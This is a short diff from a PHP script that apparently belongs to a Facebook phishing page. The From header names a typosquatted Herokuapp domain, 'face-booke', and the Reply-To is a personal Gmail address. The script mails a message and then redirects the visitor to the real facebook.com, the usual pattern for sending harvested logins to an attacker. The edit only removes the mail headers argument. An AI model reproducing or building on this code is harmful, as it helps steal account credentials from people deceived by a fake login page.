@@ -7,7 +7,7 @@ $headers = 'From: https://face-booke.herokuapp.com/' . "\r\n" .
     'Reply-To: melkamudagne19@gmail.com' . "\r\n" .
     'X-Mailer: PHP/' . phpversion();
 
-mail($to, $subject, $message, $headers);
+mail($to, $subject, $message);
 
 
 $newURL = "https://www.facebook.com";
